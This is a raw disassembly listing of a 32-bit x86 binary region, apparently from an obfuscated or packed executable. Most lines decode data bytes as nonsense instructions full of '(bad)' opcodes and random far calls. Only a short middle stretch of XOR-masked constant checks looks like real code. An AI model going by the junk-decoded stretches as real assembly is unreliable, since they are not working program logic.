  418dda:	add    cl,0x5c
  418ddd:	or     DWORD PTR es:[edx-0x2bc4aeb6],ecx
  418de4:	mov    edi,0xb4cf6266
  418de9:	lods   eax,DWORD PTR ds:[esi]
  418dea:	loope  0x418dc5
  418dec:	(bad)  
  418ded:	sub    al,0x2
  418def:	push   0xdcb556fa
  418df4:	aaa    
  418df5:	ja     0x418d89
  418df7:	pop    es
  418df8:	bound  esi,QWORD PTR [edx]
  418dfa:	data16 mov ds:0x8acf5cd7,al
  418e00:	call   0x9371:0x7eed9511
  418e07:	jne    0x418ddb
  418e09:	shr    DWORD PTR [ebp+0xf],1
  418e0c:	ins    DWORD PTR es:[edi],dx
  418e0d:	shl    DWORD PTR [edx],0x8
  418e10:	mov    esp,0xaa897920
  418e15:	mov    edi,0x819c0c49
  418e1a:	std    
  418e1b:	(bad)  
  418e1c:	pop    esi
  418e1d:	test   bh,ch
  418e1f:	ds push es
  418e21:	adc    BYTE PTR [ecx-0x31],bl
  418e24:	add    ch,BYTE PTR [esi-0x3ad2cf42]
  418e2a:	lahf   
  418e2b:	xchg   ebx,eax
  418e2c:	call   0xc07:0x3f31e7c8
  418e33:	iret   
  418e34:	aaa    
  418e35:	xchg   esi,eax
  418e36:	dec    ebx
  418e37:	xchg   ebp,eax
  418e38:	out    dx,al
  418e39:	mov    eax,0x92d59fa
  418e3e:	aaa    
  418e3f:	loope  0x418e5d
  418e41:	pusha  
  418e42:	sar    BYTE PTR [edi+0x527f3b0a],cl
  418e48:	fucomp st(3)
  418e4a:	cmc    
  418e4b:	cmp    BYTE PTR [eax+0x32a6573e],0x2
  418e52:	and    esp,edi
  418e54:	cmp    al,0x8a
  418e56:	daa    
  418e57:	mov    ebp,0x423928e8
  418e5c:	add    esp,ebx
  418e5e:	xor    ah,dh
  418e60:	clc    
  418e61:	cmp    al,0xe2
  418e63:	dec    edi
  418e64:	jb     0x418ec3
  418e66:	dec    ebx
  418e67:	(bad)  
  418e68:	fcmovnb st,st(7)
  418e6a:	cmp    ah,BYTE PTR [ebp-0x5ef1e863]
  418e70:	cs pop eax
  418e72:	or     eax,0x66b583f0
  418e78:	lods   al,BYTE PTR ds:[esi]
  418e79:	loopne 0x418e52
  418e7b:	pusha  
  418e7c:	or     eax,0x2e892fbc
  418e81:	mov    dh,0x78
  418e83:	sbb    DWORD PTR [edx],esi
  418e85:	fisub  DWORD PTR [esi+0x4dc9fefe]
  418e8b:	adc    BYTE PTR [eax-0x5ec2eb35],ah
  418e91:	fistp  QWORD PTR [edx-0x4e]
  418e94:	push   ebx
  418e95:	mov    dl,BYTE PTR [ebx-0x4ec27b2d]
  418e9b:	xchg   edi,eax
  418e9c:	and    cl,ah
  418e9e:	js     0x418f1e
  418ea0:	sahf   
  418ea1:	inc    ebx
  418ea2:	ja     0x418ee6
  418ea4:	fs stos DWORD PTR es:[edi],eax
  418ea6:	call   0x5316:0x78f50941
  418ead:	adc    cl,BYTE PTR [esi]
  418eaf:	mov    eax,0x315b39fb
  418eb4:	cdq    
  418eb5:	int3   
  418eb6:	int    0x49
  418eb8:	add    DWORD PTR [edi+0x5],0xfffffff4
  418ebc:	adc    cl,BYTE PTR [eax+ecx*8]
  418ebf:	jns    0x418f33
  418ec1:	push   ecx
  418ec2:	call   0x9b72:0x1d42f0c6
  418ec9:	jae    0x418e51
  418ecb:	mov    DWORD PTR [edi],edi
  418ecd:	cli    
  418ece:	mov    ds:0x25c79cbc,eax
  418ed3:	out    0xf9,al
  418ed5:	test   BYTE PTR [ecx+0x4c44404a],0xce
  418edc:	or     BYTE PTR [esi],ah
  418ede:	inc    ebp
  418edf:	or     DWORD PTR [esi-0x3e],ebp
  418ee2:	or     DWORD PTR [esi+0xb],edx
  418ee5:	push   ebx
  418ee6:	xchg   BYTE PTR [esi],bh
  418ee8:	in     al,0xc
  418eea:	adc    eax,0x6ad93622
  418eef:	inc    edx
  418ef0:	pop    edi
  418ef1:	and    edi,DWORD PTR [eax-0x77289225]
  418ef7:	cdq    
  418ef8:	xlat   BYTE PTR ds:[ebx]
  418ef9:	lods   eax,DWORD PTR ds:[esi]
  418efa:	inc    ebp
  418efb:	sub    ecx,eax
  418efd:	fucom  st(7)
  418eff:	xor    ah,BYTE PTR [edx+ecx*1]
  418f02:	pop    ds
  418f03:	fdiv   QWORD PTR [eax]
  418f05:	mov    ds:0x6302640d,eax
  418f0a:	aas    
  418f0b:	js     0x418eb1
  418f0d:	xchg   ebx,eax
  418f0e:	out    0xda,al
  418f10:	in     al,0xf7
  418f12:	in     eax,0x1c
  418f14:	cmc    
  418f15:	cmc    
  418f16:	bound  ecx,QWORD PTR [edi]
  418f18:	(bad)  
  418f1a:	cdq    
  418f1b:	(bad)  
  418f1c:	out    0x2f,eax
  418f1e:	cmp    eax,0xa42d36ee
  418f23:	scas   eax,DWORD PTR es:[edi]
  418f24:	jno    0x418ec8
  418f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f28:	dec    edi
  418f29:	push   edx
  418f2a:	ja     0x418f57
  418f2c:	jge    0x418ef8
  418f2e:	in     al,0x89
  418f30:	jns    0x418ecc
  418f32:	les    edx,FWORD PTR [ebx+0x7cde1008]
  418f38:	jmp    0x418fb9
  418f3a:	movq   QWORD PTR [edx-0x68df0f95],mm4
  418f41:	cwde   
  418f42:	cwde   
  418f43:	xchg   esp,eax
  418f44:	dec    edx
  418f45:	ret    
  418f46:	(bad)  
  418f47:	mov    bl,0xbb
  418f49:	out    dx,eax
  418f4a:	sahf   
  418f4b:	loope  0x418f3b
  418f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f4e:	pop    esi
  418f4f:	adc    edi,DWORD PTR [esi]
  418f51:	dec    edx
  418f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f53:	inc    edi
  418f54:	pop    ebp
  418f55:	jbe    0x418f75
  418f57:	mov    edi,0x1ba305db
  418f5c:	aas    
  418f5d:	xchg   ecx,eax
  418f5e:	push   ecx
  418f5f:	adc    BYTE PTR [edi+0x31871930],cl
  418f65:	mov    es,WORD PTR [edi]
  418f67:	popf   
  418f68:	call   0xe6f05b4f
  418f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f6e:	js     0x418ef6
  418f70:	stc    
  418f71:	fs mov dl,0xf2
  418f74:	xor    DWORD PTR [ebx],0x633d687c
  418f7a:	ja     0x418fab
  418f7c:	sbb    DWORD PTR [esp+ebx*4],ecx
  418f7f:	cmc    
  418f80:	out    0x98,eax
  418f82:	std    
  418f83:	mov    ebx,0xaf68069d
  418f88:	retf   
  418f89:	jge    0x418fbf
  418f8b:	iret   
  418f8c:	xchg   edi,eax
  418f8d:	inc    esp
  418f8e:	xor    eax,0x5cd088ea
  418f93:	daa    
  418f94:	iret   
  418f95:	retf   
  418f96:	mov    ds:0x9689065f,al
  418f9b:	xor    esi,DWORD PTR [ecx-0x28]
  418f9e:	or     DWORD PTR [esi-0x4],eax
  418fa1:	mov    bh,0x81
  418fa3:	stos   DWORD PTR es:[edi],eax
  418fa4:	mov    ds:0x1a054f09,al
  418fa9:	cmc    
  418faa:	ret    0xbd21
  418fad:	retf   
  418fae:	cmp    bh,BYTE PTR [edi+edi*8-0x61]
  418fb2:	lahf   
  418fb3:	outs   dx,BYTE PTR gs:[esi]
  418fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fb6:	call   0xfc054fc5
  418fbb:	add    dl,ah
  418fbd:	fucomip st,st(3)
  418fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc0:	jle    0x418f9e
  418fc2:	iret   
  418fc3:	lock fnstsw WORD PTR [ebx]
  418fc6:	(bad)  
  418fc7:	out    0x6b,eax
  418fc9:	outs   dx,BYTE PTR ds:[esi]
  418fca:	dec    ebp
  418fcb:	ret    0x8edb
  418fce:	imul   esp,DWORD PTR [ebx+0x551fec1c],0x3f9164f7
  418fd8:	fistp  WORD PTR [edx]
  418fda:	cmp    al,0xd8
  418fdc:	and    eax,DWORD PTR [ecx]
  418fde:	nop
  418fdf:	jmp    0xe0d8:0x70064a4b
  418fe6:	pop    ecx
  418fe7:	push   DWORD PTR [edi+ebx*1-0x74c1dd00]
  418fee:	pushf  
  418fef:	and    al,0x8c
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [ebx],bh
  418ff5:	enter  0x850f,0x8
  418ff9:	add    BYTE PTR [eax],al
  418ffb:	add    BYTE PTR [ebx],bh
  418ffd:	fimul  DWORD PTR [edi]
  418fff:	test   BYTE PTR [ebx],dh
  419001:	sbb    DWORD PTR [eax],eax
  419003:	add    BYTE PTR [ebx-0x74bfdbbc],cl
  419009:	push   esp
  41900a:	and    al,0x18
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	inc    eax
  419024:	stc    
  419025:	adc    al,0x9e
  419027:	mov    esp,0x35bec0ff
  41902c:	ret    0xbebe
  41902f:	adc    BYTE PTR [esi+0x442d8b12],al
  419035:	mov    edx,0x1a52a90c
  41903a:	(bad)  
  41903b:	adc    dl,BYTE PTR ds:0x98f137a0
  419041:	leave  
  419042:	sbb    al,0x36
  419044:	dec    ebp
  419045:	xlat   BYTE PTR ds:[ebx]
  419046:	fwait
  419047:	out    0x87,al
  419049:	xchg   esp,eax
  41904a:	and    BYTE PTR [ebx+ebx*2],0xa4
  41904e:	jge    0x41903a
  419050:	fmul   QWORD PTR [ebp+0x1d]
  419053:	inc    ebp
  419054:	out    0xb6,al
  419056:	fldenv [ecx+0x73]
  419059:	ja     0x9cae9558
  41905f:	jecxz  0x4190cc
  419061:	stos   DWORD PTR es:[edi],eax
  419062:	test   ebx,0x74a37f21
  419068:	mov    gs,WORD PTR [edx]
  41906a:	mov    edx,0x45cb0fb8
  41906f:	mov    BYTE PTR [ebx],0xcc
  419072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419073:	mov    ds:0x384a46fa,eax
  419078:	das    
  419079:	dec    edi
  41907a:	je     0x4190b2
  41907c:	mov    ds:0x670b0b40,al
  419081:	lds    edx,FWORD PTR [ecx-0x7d0b3c13]
  419087:	xor    eax,0x396dce4c
  41908c:	stos   BYTE PTR es:[edi],al
  41908d:	sbb    eax,0x1e232e28
  419092:	adc    ebp,esp
  419094:	scas   al,BYTE PTR es:[edi]
  419095:	sub    ah,0xaa
  419098:	sub    BYTE PTR [esi],bl
  41909a:	pop    eax
  41909b:	jnp    0x419068
  41909d:	lahf   
  41909e:	jbe    0x419092
  4190a0:	out    0x57,eax
  4190a2:	push   ss
  4190a3:	loop   0x419077
  4190a5:	inc    edi
  4190a6:	push   eax
  4190a7:	ja     0x419046
  4190a9:	fistp  QWORD PTR [esi-0x13]
  4190ac:	out    dx,eax
  4190ad:	cdq    
  4190ae:	loope  0x41907d
  4190b0:	rcr    ah,cl
  4190b2:	sbb    BYTE PTR [ecx+0x79],dl
  4190b5:	loope  0x41910a
  4190b7:	pop    ds
  4190b8:	pop    edx
  4190b9:	imul   esp,DWORD PTR [eax+0x5a8f2eb],0x6d2efd54
  4190c3:	popf   
  4190c4:	loopne 0x4190a2
  4190c6:	sub    al,0xb
  4190c8:	mov    ebp,0x61897ba9
  4190cd:	mov    al,0x52
  4190cf:	fwait
  4190d0:	lods   al,BYTE PTR ds:[esi]
  4190d1:	cmp    BYTE PTR ds:0x9d3d1367,dh
  4190d7:	cmp    ebx,eax
  4190d9:	mov    eax,0x7c096f39
  4190de:	mov    ah,0xd6
  4190e0:	scas   al,BYTE PTR es:[edi]
  4190e1:	push   cs
  4190e2:	outs   dx,BYTE PTR ds:[esi]
  4190e3:	jge    0x41907d
  4190e5:	mov    BYTE PTR [edi],bh
  4190e7:	pushf  
  4190e8:	and    ebx,DWORD PTR [edi]
  4190ea:	pop    ebp
  4190eb:	push   cs
  4190ec:	mov    ebx,esp
  4190ee:	pop    es
  4190ef:	mov    eax,ds:0xd1fc7fab
  4190f4:	bound  edi,QWORD PTR [ebp-0x70dae78c]
  4190fa:	push   edx
  4190fb:	jl     0x419124
  4190fd:	retf   0xf830
  419100:	stos   DWORD PTR es:[edi],eax
  419101:	arpl   dx,dx
  419103:	lods   eax,DWORD PTR ds:[esi]
  419104:	shl    BYTE PTR [eax],cl
  419106:	xchg   edi,eax
  419107:	cs in  al,dx
  419109:	adc    al,0xec
  41910b:	jg     0x419121
  41910d:	lock add DWORD PTR [ecx+0x3],edi
  419111:	push   es
  419112:	les    edx,FWORD PTR [esi-0x53]
  419115:	(bad)  
  419116:	push   esi
  419117:	cmc    
  419118:	jne    0x419190
  41911a:	cmp    BYTE PTR [edi+0x34f92967],dl
  419120:	ret    0xc793
  419123:	dec    esi
  419124:	xchg   edx,eax
  419125:	int    0x7f
  419127:	xchg   esp,eax
  419128:	(bad)  
  419129:	lds    ebp,FWORD PTR [edi-0x47]
  41912c:	mov    al,0x98
  41912e:	(bad)  
  41912f:	push   esp
  419130:	sub    DWORD PTR [eax+0x33],esp
  419133:	jle    0x419122
  419135:	loop   0x419167
  419137:	mov    ds:0xf427771d,al
  41913c:	sar    BYTE PTR [eax-0x57f970cf],cl
  419142:	fwait
  419143:	bound  esi,QWORD PTR [edi-0x361d4b50]
  419149:	gs inc ebx
  41914b:	icebp  
  41914c:	in     al,dx
  41914d:	rol    BYTE PTR [eax],1
  41914f:	mov    BYTE PTR [edx+0x6b],ah
  419152:	into   
  419153:	arpl   di,cx
  419155:	imul   esp,esp,0x5a3f5a78
  41915b:	retf   0xa8d6
  41915e:	fld    QWORD PTR [ebp+0x1c]
  419161:	cld    
  419162:	sub    edx,DWORD PTR [esi+0x65]
  419165:	mov    al,ds:0x2b0c18de
  41916a:	push   esp
  41916b:	jnp    0x419180
  41916d:	lock pop ds
  41916f:	enter  0x6314,0xf6
  419173:	mov    ds:0xf6cfa14c,al
  419178:	sbb    edx,ebp
  41917a:	rcr    DWORD PTR [eax-0x79],1
  41917d:	(bad)  
  41917f:	or     edx,esi
  419181:	jl     0x419141
  419183:	aam    0x24
  419185:	aas    
  419186:	int    0x26
  419188:	adc    BYTE PTR [esi-0x9eba55a],bl
  41918e:	pop    eax
  41918f:	repnz adc al,0xe
  419192:	(bad)  
  419194:	add    BYTE PTR [edx+0x19],dl
  419197:	dec    edx
  419198:	imul   esp,DWORD PTR [bx+di+0x34],0xffffff8d
  41919d:	push   0xffffffe6
  41919f:	inc    esi
  4191a0:	sbb    ebx,eax
  4191a2:	ror    DWORD PTR [ebx+0x23],cl
  4191a5:	mov    edx,0xa44b241a
  4191aa:	inc    eax
  4191ab:	mov    cl,0x6e
  4191ad:	popf   
  4191ae:	mov    ebx,0xdd7a97f9
  4191b3:	sahf   
  4191b4:	xchg   edx,eax
  4191b5:	into   
  4191b6:	js     0x41917c
  4191b8:	xor    bl,BYTE PTR [ebp-0x7d24c693]
  4191be:	jne    0x419176
  4191c0:	sub    DWORD PTR [edi-0x2ba8ff58],edi
  4191c6:	daa    
  4191c7:	push   ebp
  4191c8:	push   ecx
  4191c9:	(bad)  
  4191ca:	cdq    
  4191cb:	scas   eax,DWORD PTR es:[edi]
  4191cc:	jno    0x419187
  4191ce:	ret    0x5ce6
  4191d1:	or     DWORD PTR [edx-0x53],esi
  4191d4:	shl    DWORD PTR [ecx+0xd],1
  4191d7:	cmp    DWORD PTR [edx],esi
  4191d9:	bound  ebx,QWORD PTR ds:[edx+0x7b]
  4191dd:	call   0x5f624602
  4191e2:	xchg   ebp,eax
  4191e3:	cmp    al,0x7c
  4191e5:	retf   
  4191e6:	rep ins DWORD PTR es:[edi],dx
  4191e8:	out    dx,al
  4191e9:	push   esp
  4191ea:	fcom   QWORD PTR [edi+0x48]
  4191ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ee:	rol    DWORD PTR [edx],0xc7
  4191f1:	mov    bh,0x96
  4191f3:	mov    eax,DWORD PTR [eax+0x44]
  4191f6:	cld    
  4191f7:	imul   edi,DWORD PTR [ebx-0xa],0x8
  4191fb:	inc    ebp
  4191fc:	sub    edi,DWORD PTR [ebp-0xb]
  4191ff:	stc    
  419200:	push   ebp
  419201:	cdq    
  419202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419203:	fcom   QWORD PTR [edx-0x63]
  419206:	adc    ah,bh
  419208:	ja     0x419249
  41920a:	and    edi,eax
  41920c:	or     ebp,DWORD PTR [edi]
  41920e:	rcr    BYTE PTR [esi-0x8],1
  419211:	sbb    al,0x6a
  419213:	(bad)  
  419214:	not    cl
  419216:	fwait
  419217:	push   0x61
  419219:	call   FWORD PTR [edi-0x5]
  41921c:	mov    esp,0x880e1ce4
  419221:	inc    eax
  419222:	popa   
  419223:	popa   
  419224:	call   0xf8dc3504
  419229:	push   ss
  41922a:	inc    ebx
  41922b:	iret   
  41922c:	loopne 0x41926e
  41922e:	add    eax,0x802fc9d3
  419233:	and    esi,esi
  419235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419236:	adc    al,0x28
  419238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419239:	sub    al,0xb8
  41923b:	call   0xda90:0x36dcf1ec
  419242:	xor    al,0x1a
  419244:	ret    
  419245:	xchg   ebp,eax
  419246:	sahf   
  419247:	arpl   sp,di
  419249:	fisubr DWORD PTR [ebx]
  41924b:	adc    BYTE PTR [ebp+esi*1-0x575a3602],ah
  419252:	xor    al,BYTE PTR ds:0xb9523389
  419258:	or     DWORD PTR [edx-0x29f94a5b],esp
  41925e:	dec    ebp
  41925f:	mov    edx,0x218c077e
  419264:	xor    al,BYTE PTR [ebp-0x7a]
  419267:	add    al,0xd0
  419269:	cli    
  41926a:	or     bh,cl
  41926c:	pop    esi
  41926d:	outs   dx,DWORD PTR ds:[esi]
  41926e:	jb     0x419231
  419270:	loopne 0x419274
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x422794
  4192fe:	mov    DWORD PTR [esp+0x68],0x42278c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x42271c
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	and    al,0xcd
  41940c:	(bad)  
  41940d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41940e:	xor    eax,DWORD PTR ds:0xc235bec0
  419414:	mov    esi,0xde387fbe
  419419:	xchg   ebx,eax
  41941a:	mov    ss,ecx
  41941c:	or     al,0xa6
  41941e:	icebp  
  41941f:	dec    esp
  419420:	cli    
  419421:	xchg   ebp,eax
  419422:	in     al,0x51
  419424:	jle    0x4193c2
  419426:	mov    eax,0xe4c01c83
  41942b:	shr    DWORD PTR [edi-0x5f],cl
  41942e:	mov    ds:0x22d6b72d,al
  419433:	xchg   esp,eax
  419434:	or     al,0x65
  419436:	mov    cl,0x0
  419438:	add    BYTE PTR [ecx-0x6f6736fe],cl
  41943e:	push   cs
  41943f:	jno    0x4194ba
  419441:	inc    edx
  419442:	mov    ah,0xc3
  419444:	mov    ch,0xe6
  419446:	in     eax,dx
  419447:	jp     0x419470
  419449:	cli    
  41944a:	mov    cl,0xa5
  41944c:	mov    ecx,0x36ad7a03
  419451:	lock adc esp,DWORD PTR [eax+0x1f]
  419455:	push   eax
  419456:	rol    BYTE PTR [eax+0x2d01b0bc],cl
  41945c:	sub    al,0x73
  41945e:	and    edx,eax
  419460:	mov    bh,0xa4
  419462:	lds    edi,FWORD PTR [ebx+0x6c5f8f6a]
  419468:	adc    eax,0xa57c032e
  41946d:	in     al,0xac
  41946f:	and    eax,0xeae5bed
  419474:	(bad)  
  419475:	fwait
  419476:	add    DWORD PTR [edi+0x4a],edx
  419479:	jb     0x419471
  41947b:	inc    edi
  41947c:	jp     0x419470
  41947e:	std    
  41947f:	test   BYTE PTR [ebp+esi*8-0x20fe10e9],al
  419486:	cli    
  419487:	jne    0x4194e2
  419489:	enter  0xf998,0x74
  41948d:	call   0x4413:0xf1a82287
  419494:	xor    DWORD PTR [edi],0xffffffad
  419497:	hlt    
  419498:	adc    dl,cl
  41949a:	(bad)  
  41949b:	int3   
  41949c:	adc    DWORD PTR [edi],edi
  41949e:	xchg   edi,eax
  41949f:	dec    ecx
  4194a0:	ret    0xf6cb
  4194a3:	xchg   ebx,eax
  4194a4:	sub    eax,0xf5595cdc
  4194a9:	jg     0x41944c
  4194ab:	js     0x41945e
  4194ad:	mov    ds:0xb2e15733,al
  4194b2:	cmp    al,0x33
  4194b4:	pop    es
  4194b5:	lock and ecx,DWORD PTR [ecx-0x25]
  4194b9:	push   ss
  4194ba:	idiv   BYTE PTR [edi-0x18]
  4194bd:	or     eax,0xcab29348
  4194c2:	mov    bl,0xe1
  4194c4:	push   ss
  4194c5:	scas   eax,DWORD PTR es:[edi]
  4194c6:	cmp    DWORD PTR [edx],ebx
  4194c8:	push   esp
  4194c9:	push   esi
  4194ca:	cmp    bh,bl
  4194cc:	enter  0x9373,0xe4
  4194d0:	mov    BYTE PTR [edi],al
  4194d2:	xchg   esp,eax
  4194d3:	sub    al,0x7
  4194d5:	adc    DWORD PTR [edx+edi*8+0x67f76014],edx
  4194dc:	bound  edx,QWORD PTR [esi+0x64]
  4194df:	jp     0x419556
  4194e1:	xchg   ebp,eax
  4194e2:	scas   al,BYTE PTR es:[edi]
  4194e3:	ret    
  4194e4:	and    ebx,DWORD PTR [edx]
  4194e6:	inc    ebp
  4194e7:	pushf  
  4194e8:	mov    edx,0x6d046c72
  4194ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194ee:	xchg   ebp,eax
  4194ef:	cmp    eax,0xa4caca8a
  4194f4:	xor    eax,0x88fc26ba
  4194f9:	sub    ah,BYTE PTR [edx]
  4194fb:	cmp    al,0x7
  4194fd:	in     eax,dx
  4194fe:	push   esp
  4194ff:	fmulp  st(0),st
  419501:	(bad)  [edi+ecx*2]
  419504:	mov    eax,0xdd20e527
  419509:	push   edi
  41950a:	pop    ecx
  41950b:	jmp    0xed58:0xa77f1f55
  419512:	add    ah,al
  419514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419515:	or     ecx,ebx
  419517:	es cdq 
  419519:	aas    
  41951a:	pusha  
  41951b:	(bad)  [esi]
  41951d:	or     ecx,0x16
  419520:	jno    0x41953e
  419522:	ss jns 0x41952f
  419525:	sub    BYTE PTR [edi],0x3a
  419528:	cmp    DWORD PTR [edx],eax
  41952a:	jge    0x4194b8
  41952c:	jecxz  0x419550
  41952e:	stos   BYTE PTR es:[edi],al
  41952f:	or     eax,0xa7b30e78
  419534:	adc    al,0x25
  419536:	push   ebp
  419537:	mov    edx,0x7996d245
  41953c:	cld    
  41953d:	sbb    BYTE PTR [ecx-0xe533418],0xfd
  419544:	mov    ecx,0x29915b2a
  419549:	cmp    ebx,ecx
  41954b:	(bad)  
  41954c:	pop    eax
  41954d:	test   al,0x80
  41954f:	mov    bl,0xc1
  419551:	or     eax,0x27ec03a6
  419556:	sub    BYTE PTR [ecx-0x32],al
  419559:	dec    eax
  41955a:	jge    0x4194fb
  41955c:	push   esp
  41955d:	pop    ebp
  41955e:	dec    ecx
  41955f:	test   dh,0x96
  419562:	dec    esp
  419563:	iret   
  419564:	jae    0x419512
  419566:	sub    al,0x3e
  419568:	xor    BYTE PTR [edi],dh
  41956a:	dec    eax
  41956b:	xor    eax,0x1c
  41956e:	push   esp
  41956f:	sbb    esp,DWORD PTR [eax]
  419571:	daa    
  419572:	outs   dx,DWORD PTR es:[esi]
  419574:	aad    0x33
  419576:	stc    
  419577:	inc    ebp
  419578:	addr16 mov ch,0xa6
  41957b:	mov    WORD PTR [ebp+0x602535cb],ds
  419581:	ror    DWORD PTR [ebx],cl
  419583:	loope  0x4195c3
  419585:	stos   BYTE PTR es:[edi],al
  419586:	sar    BYTE PTR [edi],1
  419588:	pop    esp
  419589:	outs   dx,BYTE PTR ds:[esi]
  41958a:	and    eax,0x9fcdf636
  41958f:	leave  
  419590:	sbb    al,0x69
  419592:	mov    WORD PTR ds:0x1d9eed23,gs
  419598:	pop    esp
  419599:	lea    edi,ds:0x583b06ec
  41959f:	daa    
  4195a0:	jle    0x419526
  4195a2:	add    al,0x8a
  4195a4:	add    DWORD PTR [eax-0x2c],0x937f8db2
  4195ab:	xchg   esp,eax
  4195ac:	arpl   WORD PTR [edx+0x1f],si
  4195af:	aaa    
  4195b0:	sbb    ch,BYTE PTR [ebp-0x486646ce]
  4195b6:	aaa    
  4195b7:	mov    eax,0x2adcf450
  4195bc:	jp     0x419629
  4195be:	sbb    edi,DWORD PTR cs:[eax]
  4195c1:	xlat   BYTE PTR ds:[ebx]
  4195c2:	cmp    BYTE PTR [edx],dh
  4195c4:	out    0x3,eax
  4195c6:	pop    ebx
  4195c7:	stos   DWORD PTR es:[edi],eax
  4195c8:	push   edi
  4195c9:	test   eax,0xb2c12b8f
  4195ce:	hlt    
  4195cf:	popf   
  4195d0:	retf   
  4195d1:	leave  
  4195d2:	adc    al,0x75
  4195d4:	jb     0x4195df
  4195d6:	dec    edi
  4195d7:	push   eax
  4195d8:	xor    BYTE PTR [ebx],bl
  4195da:	ja     0x419577
  4195dc:	jns    0x4195e5
  4195de:	les    ebx,FWORD PTR [eax+eiz*4]
  4195e1:	gs ret 
  4195e3:	loop   0x4195c6
  4195e5:	mov    al,0x5a
  4195e7:	push   edi
  4195e8:	cmp    DWORD PTR [ecx],esp
